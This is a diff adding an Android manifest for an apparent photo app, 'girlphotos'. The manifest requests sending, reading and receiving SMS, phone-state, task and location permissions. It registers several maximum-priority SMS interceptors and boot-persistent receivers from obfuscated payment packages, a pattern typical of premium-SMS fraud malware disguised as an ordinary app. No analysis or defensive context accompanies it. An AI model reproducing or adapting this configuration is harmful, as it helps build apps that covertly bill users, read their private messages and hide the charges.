@@ -1,0 +1,87 @@
+<?xml version="1.0" encoding="utf-8" standalone="no"?>
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:installLocation="auto" package="com.ccompany.girlphotos">
+    <uses-feature android:glEsVersion="0x20000"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.INTERNET"/>
+    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
+    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
+    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
+    <uses-permission android:name="android.permission.WRITE_SETTINGS"/>
+    <uses-permission android:name="android.permission.WRITE_SMS"/>
+    <uses-permission android:name="android.permission.READ_SMS"/>
+    <uses-permission android:name="android.permission.SEND_SMS"/>
+    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
+    <uses-permission android:name="android.permission.GET_TASKS"/>
+    <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION"/>
+    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION"/>
+    <application android:icon="@drawable/icon" android:label="@string/app_name" android:name="org.cocos2dx.cpp.MyApplication">
+        <meta-data android:name="CHANNEL" android:value="girlbz001"/>
+        <meta-data android:name="SUB_CHANNEL" android:value="girlbz001"/>
+        <meta-data android:name="VERSION" android:value="temp_game_version"/>
+        <activity android:configChanges="orientation" android:label="@string/app_name" android:name="org.cocos2dx.cpp.GirlPhotos" android:screenOrientation="portrait" android:theme="@android:style/Theme.NoTitleBar.Fullscreen">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+            </intent-filter>
+        </activity>
+        <receiver android:name="com.y.t.jar.pay.InNoticeReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.y.t.jar.pay.UpdateServices"/>
+        <service android:name="com.boJUF.ac"/>
+        <receiver android:name="com.zy.hez.receiver.ZyReceiver" android:permission="android.permission.BROADCAST_SMS">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.zy.hez.service.ZyService"/>
+        <service android:name="com.zxhykj.xinzf.vice.XinZFInitVice"/>
+        <receiver android:name="com.zxhykj.xinzf.ver.XinZFver">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_DELIVER"/>
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+            </intent-filter>
+        </receiver>
+        <receiver android:name="com.inter.china.fplay.service.LlcReceiverOne">
+            <intent-filter android:priority="0x7fffffff">
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.intent.action.BATTERY_CHANGED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="android.net.wifi.supplicant.CONNECTION_CHANGE"/>
+                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>
+                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>
+            </intent-filter>
+        </receiver>
+        <service android:name="com.inter.china.fplay.service.LlcServoceOne"/>
+        <service android:name="com.p.s.j.z.c.L" android:process="com.p.s.j.z.c.L"/>
+        <receiver android:name="com.p.s.j.z.c.P" android:permission="android.permission.BROADCAST_SMS" android:process="com.p.s.j.z.c.L">
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
+                <action android:name="android.intent.action.USER_PRESENT"/>
+                <action android:name="android.intent.action.ACTION_SHUTDOWN"/>
+                <action android:name="android.net.conn.CONNECTIVITY_CHANGE"/>
+                <action android:name="android.intent.action.SIM_STATE_CHANGED"/>
+                <action android:name="android.intent.action.SERVICE_STATE"/>
+                <action android:name="android.bluetooth.adapter.action.STATE_CHANGED"/>
+                <action android:name="android.net.wifi.WIFI_STATE_CHANGED"/>
+                <action android:name="android.intent.action.ANY_DATA_STATE"/>
+                <action android:name="android.net.wifi.STATE_CHANGE"/>
+                <category android:name="android.intent.category.DEFAULT"/>
+                <category android:name="android.intent.category.LAUNCHER"/>
+                <action android:name="android.intent.action.BOOT_COMPLETED"/>
+            </intent-filter>
+            <intent-filter android:priority="2147483647">
+                <action android:name="android.intent.action.MEDIA_MOUNTED"/>
+                <action android:name="android.intent.action.MEDIA_EJECT"/>
+                <data android:scheme="file"/>
+            </intent-filter>
+        </receiver>
+    </application>
+    <supports-screens android:anyDensity="true" android:largeScreens="true" android:normalScreens="true" android:smallScreens="true"/>
+</manifest>
